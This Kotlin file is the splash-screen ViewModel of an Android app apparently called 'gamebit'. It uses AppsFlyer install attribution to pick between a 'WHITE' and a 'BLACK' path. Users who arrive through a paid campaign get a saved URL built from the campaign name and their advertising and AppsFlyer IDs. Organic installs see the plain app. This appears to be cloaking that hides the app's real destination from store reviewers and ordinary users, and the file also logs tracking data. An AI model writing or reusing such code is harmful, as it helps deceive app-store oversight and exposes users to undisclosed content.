package com.dat.android.gamebit.presentation

import android.app.Application
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.MutableLiveData
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.dat.android.gamebit.App
import com.dat.android.gamebit.utils.PreferenceProvider
import com.dat.android.gamebit.utils.URLMaker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import java.lang.Error

class SplashVM(application: Application) : AndroidViewModel(application) {
    private var job = Job()
    private val scope = CoroutineScope(Dispatchers.Main + job)
    private val ATTR = "campaign"
    private val ATTR_STATUS = "af_status"
    private val ADVERT_ID = "advertising_id"
    private val NON_ORGANIC = "Non-organic"

    private var status = MutableLiveData<Int>()

    private var isStartedOpen = false

    private var appContext: App
        get() = getApplication<App>()
        set(value) {}

    fun getStatusLD(): MutableLiveData<Int> {
        if (status == null) {
            status = MutableLiveData()
        }
        return status!!
    }

    init {
        bindUser()
    }

    private fun bindUser() {
        if (PreferenceProvider.getUrl() != PreferenceProvider.EMPTY_URL) {
            status.value = BLACK
        } else {
            startVerif()
        }
    }

    private fun startVerif() {

        val conversionDataListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                data?.let { cvData ->
                    cvData.map {
                        Log.e("LOL", "conversion_attribute:  ${it.key} = ${it.value}")
                    }
                    var naming = (data!![ATTR] ?: "") as String
                    var status = (data!![ATTR_STATUS] ?: "") as String
                    var adId = data!![ADVERT_ID].toString()


                    if (!isStartedOpen) {
                        isStartedOpen = true
                        parseNaming(naming, status, adId)
                        //parseNaming("sub%sub%sub%sub%sub%sub%", NON_ORGANIC, "asdasd")
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                parseNaming("", "", "")
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(error: String?) {
                parseNaming("", "", "")
            }
        }

        AppsFlyerLib
            .getInstance()
            .init("fTHMhfusDFFptFAiXDJ2fU", conversionDataListener, appContext)
        AppsFlyerLib.getInstance().start(appContext)

    }

    private fun parseNaming(naming: String, status: String, adId: String) {

        /*var apsId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
        var url = URLMaker.createLink(naming, adId, apsId)
        Log.e("LOL", "id ------- $url")
        PreferenceProvider.saveUrl(url)
        this.status.postValue(BLACK)*/


        if (naming != "") {
            if (status == NON_ORGANIC) {
                var apsId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
                var url = URLMaker.createLink(naming, adId, apsId)
                Log.e("LOL", "id ------- $url")
                PreferenceProvider.saveUrl(url)
                this.status.postValue(BLACK)
            } else {
                this.status.postValue(WHITE)
            }
        } else {
            this.status.postValue(WHITE)
        }
    }

    companion object {
        const val WHITE = 0
        const val BLACK = 1
    }
}